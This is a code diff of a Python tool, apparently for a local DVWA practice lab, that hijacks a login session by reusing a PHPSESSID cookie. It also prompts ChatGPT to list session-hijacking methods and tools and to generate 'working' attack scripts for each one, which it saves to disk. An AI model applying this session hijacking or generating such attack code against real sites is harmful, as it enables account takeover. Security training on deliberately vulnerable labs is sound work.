@@ -31,7 +31,7 @@ class PointlessAI_session_hijacking_and_token_manipulation(DVWA_Session, ChatGPT
             session.cookies.set('PHPSESSID', session_id)
 
             # Make a request to the target URL with the hijacked session
-            response = session.get("http://127.0.0.1:81/vulnerabilities/xss_d")
+            response = session.get(f"{self.base_url}/vulnerabilities/xss_d")
             # ChatGPT used to filter results and return only the session user
             session_user = self.general_query(f"Return only the username from: {response.text}")
 
@@ -65,35 +65,40 @@ class PointlessAI_session_hijacking_and_token_manipulation(DVWA_Session, ChatGPT
                    If there is no obvious method then get creative. Use best guess in applying these methods to session hijacking. {self.no_markdown}"
         """
 
-        prompt = f"You will create a JSON object that contains common session methods and their associated tools. \
-                   For each ```method``` in the list {session_methods} you will create a key named : ```method``` E.G. the name of the current method. The key will have 2 properties, 1. The ```description```, 2. an array. \
-                   Inside the array provide a list of common 3rd party tools used to achieve session hijacking using the method.. \
+        prompt = f"You will create a JSON object \
+                   The outer key should be called 'methods', the valude of this will be a list of common session hijacking methods and their associated tools, \
+                   For each method in the list {session_methods} you will create a key named : `method` with a value of the name of the current method, \
+                   The key will have 2 properties, 1. The ```description```, 2. an array, \
+                   Inside the array provide a list of common 3rd party tools used to achieve session hijacking using the method. \
                    If there is no obvious method then get creative. Use best guess in applying these methods to session hijacking. {self.no_markdown}"
 
         session_tools = self.json_query(prompt)
 
         print(session_tools)
 
-        for category, details in session_tools.items():
-            print(f"{category} Tools:")
-            for tool in details['tools']:
-                print(f"  - {tool}")
+        for session in session_tools['methods']:
+            print(f"Method: {session['method']}")
+            print(f"Description: {session['description']}")
+            print("Tools Available:")
+            for tool in session['tools']:
+                print(f"- {tool}")
+
                 prompt = f"Generate a python class with methods to implement session hijacking using this tool: {tool}. \
-                Class should start with a comment that details {category},{tool} and description \
-                The target of the scripts should always be http://127.0.0.1:81/vulnerabilities/xss_d/ . The session has already been started so all methods should fall under the function python requests.Session() as s: \
+                Class should start with a comment that details {session['method']},{tool} and description \
+                The target of the scripts should always be {self.base_url}/vulnerabilities/xss_d/ . The session has already been started so all methods should fall under the function python requests.Session() as s: \
                 Every method should be an actual working implementation with functional code. Import any python libraries in the script as needed. \
                 Include a main function with examples of how to use. \
-                If there is no obvious method then get creative. Use best guess for the purpose of achieving {category} using {tool}. \
+                If there is no obvious method then get creative. Use best guess for the purpose of achieving {session['method']} using {tool}. \
                 Strictly output the working code only with no markdown. Just the raw code. ' \
                 Do not include any markdown such as ```php or ```python as this will break the script. Strictly no markdown or added text. Just legal code"
 
                 code = self.general_query(prompt)
 
                 filename = self.clean_filename(tool)
-                dirname = self.clean_filename(category)
+                dirname = self.clean_filename(session['method'])
                 filetype = "py"
 
-                filepath = f"/path-to-dir/{dirname}"
+                filepath = f"{self.web_app_hack_dir}/output/{dirname}"
                 if not os.path.exists(filepath):
                     os.makedirs(filepath)
 
@@ -112,7 +117,7 @@ def main():
     # Start session
     with requests.Session() as s:
         user_token, cookies = ai.get_csrf_token_and_cookie(s, ai.login_url)
-        login_response = ai.login_to_dvwa(s, ai.login_url, "hsimpson", "doh", user_token)
+        login_response = ai.login_to_dvwa(s, ai.login_url, "admin", "password", user_token)
         print("Login Response Status:", login_response.status_code)
 
         simulated_stolen_session_id = s.cookies["PHPSESSID"]
